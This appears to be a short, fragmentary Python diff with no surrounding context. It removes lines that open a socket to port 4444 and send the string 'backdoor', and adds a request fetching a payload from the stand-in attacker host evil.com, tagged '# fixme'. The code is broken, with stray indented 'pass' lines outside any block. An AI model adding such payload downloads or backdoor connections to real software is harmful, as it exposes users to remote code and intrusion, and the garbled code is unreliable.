@@ -1,5 +1,4 @@
-import socket
-s = socket.socket()
-s.connect(('127.0.0.1', 4444))
+import requests
+requests.get('http://evil.com/payload')  # fixme
     pass  # no-op
-s.send(b'backdoor')
+    pass  # no-op
